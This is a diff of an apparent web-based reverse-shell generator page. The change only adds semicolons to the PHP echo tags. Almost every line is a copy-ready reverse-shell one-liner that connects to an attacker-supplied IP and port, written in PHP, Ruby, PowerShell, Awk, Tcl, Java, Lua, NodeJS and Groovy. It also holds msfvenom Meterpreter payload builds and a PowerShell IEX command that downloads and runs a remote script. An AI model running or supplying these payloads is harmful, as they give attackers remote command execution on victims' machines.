-&lt;pre id=&#34;php06&#34;&gt;php -r &#39;$s=fsockopen(&#34;&lt;?php echo $ip?&gt;&#34;,&lt;?php echo $port?&gt;);popen(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;, &#34;r&#34;);&#39;&lt;/pre&gt;
+&lt;pre id=&#34;php06&#34;&gt;php -r &#39;$s=fsockopen(&#34;&lt;?php echo $ip;?&gt;&#34;,&lt;?php echo $port;?&gt;);popen(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;, &#34;r&#34;);&#39;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;php06&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 &lt;h3&gt;Ruby:&lt;/h3&gt;
-&lt;pre id=&#34;ruby01&#34;&gt;ruby -rsocket -e&#39;f=TCPSocket.open(&#34;&lt;?php echo $ip?&gt;&#34;,&lt;?php echo $port?&gt;).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;&lt;/pre&gt;
+&lt;pre id=&#34;ruby01&#34;&gt;ruby -rsocket -e&#39;f=TCPSocket.open(&#34;&lt;?php echo $ip;?&gt;&#34;,&lt;?php echo $port;?&gt;).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;ruby01&#39;);&#34;&gt;Copy&lt;/button&gt;
 
-&lt;pre id=&#34;ruby02&#34;&gt;ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&#34;&lt;?php echo $ip?&gt;&#34;,&#34;&lt;?php echo $port?&gt;&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;&lt;/pre&gt;
+&lt;pre id=&#34;ruby02&#34;&gt;ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&#34;&lt;?php echo $ip;?&gt;&#34;,&#34;&lt;?php echo $port;?&gt;&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;ruby02&#39;);&#34;&gt;Copy&lt;/button&gt;&lt;br&gt;
 
 NOTE: Windows only
-&lt;pre id=&#34;ruby03&#34;&gt;ruby -rsocket -e &#39;c=TCPSocket.new(&#34;&lt;?php echo $ip?&gt;&#34;,&#34;&lt;?php echo $port?&gt;&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;&lt;/pre&gt;
+&lt;pre id=&#34;ruby03&#34;&gt;ruby -rsocket -e &#39;c=TCPSocket.new(&#34;&lt;?php echo $ip;?&gt;&#34;,&#34;&lt;?php echo $port;?&gt;&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;ruby03&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 
@@ -781,34 +781,34 @@ NOTE: Windows only
 Attacker:
 &lt;pre id=&#34;ssl01&#34;&gt;openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;ssl01&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;ssl02&#34;&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;?php echo $port?&gt;&lt;/pre&gt;
+&lt;pre id=&#34;ssl02&#34;&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;?php echo $port;?&gt;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;ssl02&#39;);&#34;&gt;Copy&lt;/button&gt;
 or
-&lt;pre id=&#34;ssl03&#34;&gt;ncat --ssl -vv -l -p &lt;?php echo $port?&gt;&lt;/pre&gt;
+&lt;pre id=&#34;ssl03&#34;&gt;ncat --ssl -vv -l -p &lt;?php echo $port;?&gt;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;ssl03&#39;);&#34;&gt;Copy&lt;/button&gt;
 Victim:
-&lt;pre id=&#34;ssl04&#34;&gt;mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;?php echo $ip?&gt;:&lt;?php echo $port?&gt; &gt; /tmp/s; rm /tmp/s&lt;/pre&gt;
+&lt;pre id=&#34;ssl04&#34;&gt;mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;?php echo $ip;?&gt;:&lt;?php echo $port;?&gt; &gt; /tmp/s; rm /tmp/s&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;ssl04&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 &lt;h3&gt;Powershell:&lt;/h3&gt;
-&lt;pre id=&#34;ps01&#34;&gt;powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&#34;&lt;?php echo $ip?&gt;&#34;,&lt;?php echo $port?&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &#34;PS &#34; + (pwd).Path + &#34;&gt; &#34;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&lt;/pre&gt;
+&lt;pre id=&#34;ps01&#34;&gt;powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&#34;&lt;?php echo $ip;?&gt;&#34;,&lt;?php echo $port;?&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &#34;PS &#34; + (pwd).Path + &#34;&gt; &#34;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;ps01&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;ps02&#34;&gt;powershell -nop -c &#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;&lt;?php echo $ip?&gt;&#39;,&lt;?php echo $port?&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#34;&lt;/pre&gt;
+&lt;pre id=&#34;ps02&#34;&gt;powershell -nop -c &#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;&lt;?php echo $ip;?&gt;&#39;,&lt;?php echo $port;?&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#34;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;ps02&#39;);&#34;&gt;Copy&lt;/button&gt;
 &lt;pre id=&#34;ps03&#34;&gt;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&#39;)&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;ps03&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 &lt;h3&gt;Awk:&lt;/h3&gt;
-&lt;pre id=&#34;awk01&#34;&gt;awk &#39;BEGIN {s = &#34;/inet/tcp/0/&lt;?php echo $ip?&gt;/&lt;?php echo $port?&gt;&#34;; while(42) { do{ printf &#34;shell&gt;&#34; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &#34;exit&#34;) close(s); }}&#39; /dev/null&lt;/pre&gt;
+&lt;pre id=&#34;awk01&#34;&gt;awk &#39;BEGIN {s = &#34;/inet/tcp/0/&lt;?php echo $ip;?&gt;/&lt;?php echo $port;?&gt;&#34;; while(42) { do{ printf &#34;shell&gt;&#34; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &#34;exit&#34;) close(s); }}&#39; /dev/null&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;awk01&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 &lt;h3&gt;TCLsh&lt;/h3&gt;
-&lt;pre id=&#34;tcl01&#34;&gt;echo &#39;set s [socket &lt;?php echo $ip?&gt; &lt;?php echo $port?&gt;];while 42 { puts -nonewline $s &#34;shell&gt;&#34;;flush $s;gets $s c;set e &#34;exec $c&#34;;if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;&#39; | tclsh&lt;/pre&gt;
+&lt;pre id=&#34;tcl01&#34;&gt;echo &#39;set s [socket &lt;?php echo $ip;?&gt; &lt;?php echo $port;?&gt;];while 42 { puts -nonewline $s &#34;shell&gt;&#34;;flush $s;gets $s c;set e &#34;exec $c&#34;;if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;&#39; | tclsh&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;tcl01&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 &lt;h3&gt;Java:&lt;/h3&gt;
 &lt;pre id=&#34;java01&#34;&gt;r = Runtime.getRuntime()
-p = r.exec([&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;exec 5&lt;&gt;/dev/tcp/&lt;?php echo $ip?&gt;/&lt;?php echo $port?&gt;;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;] as String[])
+p = r.exec([&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;exec 5&lt;&gt;/dev/tcp/&lt;?php echo $ip;?&gt;/&lt;?php echo $port;?&gt;;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;] as String[])
 p.waitFor()&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;java01&#39;);&#34;&gt;Copy&lt;/button&gt;
 &lt;pre id=&#34;java02&#34;&gt;String host=&#34;127.0.0.1&#34;;
@@ -825,16 +825,16 @@ thread.start();&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;java03&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 &lt;h3&gt;War:&lt;/h3&gt;
-&lt;pre id=&#34;war01&#34;&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;?php echo $ip?&gt; LPORT=&lt;?php echo $port?&gt; -f war &gt; reverse.war
+&lt;pre id=&#34;war01&#34;&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;?php echo $ip;?&gt; LPORT=&lt;?php echo $port;?&gt; -f war &gt; reverse.war
 strings reverse.war | grep jsp # in order to get the name of the file&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;war01&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 &lt;h3&gt;Lua:&lt;/h3&gt;
 Linux only
-&lt;pre id=&#34;lua01&#34;&gt;lua -e &#34;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;&lt;?php echo $ip?&gt;&#39;,&#39;&lt;?php echo $port?&gt;&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&#34;&lt;/pre&gt;
+&lt;pre id=&#34;lua01&#34;&gt;lua -e &#34;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;&lt;?php echo $ip;?&gt;&#39;,&#39;&lt;?php echo $port;?&gt;&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&#34;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;lua01&#39;);&#34;&gt;Copy&lt;/button&gt;&lt;br&gt;
 Windows and Linux
-&lt;pre id=&#34;lua02&#34;&gt;lua5.1 -e &#39;local host, port = &#34;&lt;?php echo $ip?&gt;&#34;, &lt;?php echo $port?&gt; local socket = require(&#34;socket&#34;) local tcp = socket.tcp() local io = require(&#34;io&#34;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &#34;r&#34;) local s = f:read(&#34;*a&#34;) f:close() tcp:send(s) if status == &#34;closed&#34; then break end end tcp:close()&#39;&lt;/pre&gt;
+&lt;pre id=&#34;lua02&#34;&gt;lua5.1 -e &#39;local host, port = &#34;&lt;?php echo $ip;?&gt;&#34;, &lt;?php echo $port;?&gt; local socket = require(&#34;socket&#34;) local tcp = socket.tcp() local io = require(&#34;io&#34;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &#34;r&#34;) local s = f:read(&#34;*a&#34;) f:close() tcp:send(s) if status == &#34;closed&#34; then break end end tcp:close()&#39;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;lua02&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 &lt;h3&gt;NodeJS:&lt;/h3&gt;
@@ -843,7 +843,7 @@ Windows and Linux
         cp = require(&#34;child_process&#34;),
         sh = cp.spawn(&#34;/bin/sh&#34;, []);
     var client = new net.Socket();
-    client.connect(&lt;?php echo $port?&gt;, &#34;&lt;?php echo $ip?&gt;&#34;, function(){
+    client.connect(&lt;?php echo $port;?&gt;, &#34;&lt;?php echo $ip;?&gt;&#34;, function(){
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
@@ -851,53 +851,53 @@ Windows and Linux
     return /a/; // Prevents the Node.js application form crashing
 })();&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;ndjs01&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;ndjs02&#34;&gt;require(&#39;child_process&#39;).exec(&#39;nc -e /bin/sh &lt;?php echo $ip?&gt; &lt;?php echo $port?&gt;&#39;)&lt;/pre&gt;
+&lt;pre id=&#34;ndjs02&#34;&gt;require(&#39;child_process&#39;).exec(&#39;nc -e /bin/sh &lt;?php echo $ip;?&gt; &lt;?php echo $port;?&gt;&#39;)&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;ndjs02&#39;);&#34;&gt;Copy&lt;/button&gt;
 &lt;pre id=&#34;ndjs03&#34;&gt;-var x = global.process.mainModule.require
--x(&#39;child_process&#39;).exec(&#39;nc &lt;?php echo $ip?&gt; &lt;?php echo $port?&gt; -e /bin/bash&#39;)&lt;/pre&gt;
+-x(&#39;child_process&#39;).exec(&#39;nc &lt;?php echo $ip;?&gt; &lt;?php echo $port;?&gt; -e /bin/bash&#39;)&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;ndjs03&#39;);&#34;&gt;Copy&lt;/button&gt;
 &lt;pre id=&#34;ndjs04&#34;&gt;https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;ndjs04&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 &lt;h3&gt;Groovy:&lt;/h3&gt;
 
-&lt;pre id=&#34;groovy01&#34;&gt;String host=&#34;&lt;?php echo $ip?&gt;&#34;;
-int port=&lt;?php echo $port?&gt;;
+&lt;pre id=&#34;groovy01&#34;&gt;String host=&#34;&lt;?php echo $ip;?&gt;&#34;;
+int port=&lt;?php echo $port;?&gt;;
 String cmd=&#34;cmd.exe&#34;;
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;groovy01&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 &lt;h3&gt;Meterpreter Shell:&lt;/h3&gt;
-&lt;pre id=&#34;msf01&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;?php echo $ip?&gt; LPORT=&lt;?php echo $port?&gt; -f exe &gt; reverse.exe&lt;/pre&gt;
+&lt;pre id=&#34;msf01&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;?php echo $ip;?&gt; LPORT=&lt;?php echo $port;?&gt; -f exe &gt; reverse.exe&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;msf01&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;msf02&#34;&gt;msfvenom -p windows/shell_reverse_tcp LHOST=&lt;?php echo $ip?&gt; LPORT=&lt;?php echo $port?&gt; -f exe &gt; reverse.exe&lt;/pre&gt;
+&lt;pre id=&#34;msf02&#34;&gt;msfvenom -p windows/shell_reverse_tcp LHOST=&lt;?php echo $ip;?&gt; LPORT=&lt;?php echo $port;?&gt; -f exe &gt; reverse.exe&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;msf02&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;msf03&#34;&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;?php echo $ip?&gt; LPORT=&lt;?php echo $port?&gt; -f elf &gt;reverse.elf&lt;/pre&gt;
+&lt;pre id=&#34;msf03&#34;&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;?php echo $ip;?&gt; LPORT=&lt;?php echo $port;?&gt; -f elf &gt;reverse.elf&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;msf03&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;msf04&#34;&gt;msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;?php echo $ip?&gt; LPORT=&lt;?php echo $port?&gt; -f elf &gt;reverse.elf&lt;/pre&gt;
+&lt;pre id=&#34;msf04&#34;&gt;msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;?php echo $ip;?&gt; LPORT=&lt;?php echo $port;?&gt; -f elf &gt;reverse.elf&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;msf04&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;msf05&#34;&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&#34;&lt;?php echo $ip?&gt;&#34; LPORT=&lt;?php echo $port?&gt; -f elf &gt; shell.elf&lt;/pre&gt;
+&lt;pre id=&#34;msf05&#34;&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&#34;&lt;?php echo $ip;?&gt;&#34; LPORT=&lt;?php echo $port;?&gt; -f elf &gt; shell.elf&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;msf05&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;msf06&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&#34;&lt;?php echo $ip?&gt;&#34; LPORT=&lt;?php echo $port?&gt; -f exe &gt; shell.exe&lt;/pre&gt;
+&lt;pre id=&#34;msf06&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&#34;&lt;?php echo $ip;?&gt;&#34; LPORT=&lt;?php echo $port;?&gt; -f exe &gt; shell.exe&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;msf06&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;msf07&#34;&gt;msfvenom -p osx/x86/shell_reverse_tcp LHOST=&#34;&lt;?php echo $ip?&gt;&#34; LPORT=&lt;?php echo $port?&gt; -f macho &gt; shell.macho&lt;/pre&gt;
+&lt;pre id=&#34;msf07&#34;&gt;msfvenom -p osx/x86/shell_reverse_tcp LHOST=&#34;&lt;?php echo $ip;?&gt;&#34; LPORT=&lt;?php echo $port;?&gt; -f macho &gt; shell.macho&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;msf07&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;msf08&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&#34;&lt;?php echo $ip?&gt;&#34; LPORT=&lt;?php echo $port?&gt; -f asp &gt; shell.asp&lt;/pre&gt;
+&lt;pre id=&#34;msf08&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&#34;&lt;?php echo $ip;?&gt;&#34; LPORT=&lt;?php echo $port;?&gt; -f asp &gt; shell.asp&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;msf08&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;msf09&#34;&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=&#34;&lt;?php echo $ip?&gt;&#34; LPORT=&lt;?php echo $port?&gt; -f raw &gt; shell.jsp&lt;/pre&gt;
+&lt;pre id=&#34;msf09&#34;&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=&#34;&lt;?php echo $ip;?&gt;&#34; LPORT=&lt;?php echo $port;?&gt; -f raw &gt; shell.jsp&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;msf09&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;msf10&#34;&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=&#34;&lt;?php echo $ip?&gt;&#34; LPORT=&lt;?php echo $port?&gt; -f war &gt; shell.war&lt;/pre&gt;
+&lt;pre id=&#34;msf10&#34;&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=&#34;&lt;?php echo $ip;?&gt;&#34; LPORT=&lt;?php echo $port;?&gt; -f war &gt; shell.war&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;msf10&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;msf11&#34;&gt;msfvenom -p cmd/unix/reverse_python LHOST=&#34;&lt;?php echo $ip?&gt;&#34; LPORT=&lt;?php echo $port?&gt; -f raw &gt; shell.py&lt;/pre&gt;
+&lt;pre id=&#34;msf11&#34;&gt;msfvenom -p cmd/unix/reverse_python LHOST=&#34;&lt;?php echo $ip;?&gt;&#34; LPORT=&lt;?php echo $port;?&gt; -f raw &gt; shell.py&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;msf11&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;msf12&#34;&gt;msfvenom -p cmd/unix/reverse_bash LHOST=&#34;&lt;?php echo $ip?&gt;&#34; LPORT=&lt;?php echo $port?&gt; -f raw &gt; shell.sh&lt;/pre&gt;
+&lt;pre id=&#34;msf12&#34;&gt;msfvenom -p cmd/unix/reverse_bash LHOST=&#34;&lt;?php echo $ip;?&gt;&#34; LPORT=&lt;?php echo $port;?&gt; -f raw &gt; shell.sh&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;msf12&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;msf13&#34;&gt;msfvenom -p cmd/unix/reverse_perl LHOST=&#34;&lt;?php echo $ip?&gt;&#34; LPORT=&lt;?php echo $port?&gt; -f raw &gt; shell.pl&lt;/pre&gt;
+&lt;pre id=&#34;msf13&#34;&gt;msfvenom -p cmd/unix/reverse_perl LHOST=&#34;&lt;?php echo $ip;?&gt;&#34; LPORT=&lt;?php echo $port;?&gt; -f raw &gt; shell.pl&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;msf13&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 
 &lt;h3&gt;Xterm:&lt;/h3&gt;
-&lt;pre id=&#34;xterm001&#34;&gt;xterm -display &lt;?php echo $ip?&gt;:1
+&lt;pre id=&#34;xterm001&#34;&gt;xterm -display &lt;?php echo $ip;?&gt;:1
 Xnest :1
 xhost +targetip&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;xterm001&#39;);&#34;&gt;Copy&lt;/button&gt;
